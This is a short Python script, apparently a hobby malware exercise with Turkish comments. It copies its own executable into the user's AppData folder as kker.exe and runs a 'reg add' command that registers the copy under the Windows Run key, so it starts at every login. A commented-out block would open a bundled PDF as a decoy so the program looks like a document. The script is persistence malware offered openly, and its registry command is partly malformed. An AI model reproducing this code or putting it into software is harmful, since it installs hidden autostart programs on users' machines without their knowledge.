# reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /d kker /t REG_SZ /d "C:\Users\mdapl\Documents\Yazılım-Kodlama\🐍Python\Projects\Joke.exe"
import subprocess
import os
import shutil
import sys


def persistence():
    new_null = os.environ["AppData"] + "\\kker.exe"

    if not os.path.exists(new_null):
        shutil.copyfile(sys.executable, new_null)

        regedit_command = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /d kker /t REG_SZ /d " + new_null

        subprocess.call(regedit_command, shell=True)

#Merge with pdf(or some else file)
"""
def merge():
    merged_file = sys._MEIPASS + "\\book.pdf"
    subprocess.Popen(merged_file, shell=True)
    #Popen: Verilen dosyayı arka planda çalıştırmaya yarar.
    
merge()
"""

persistence()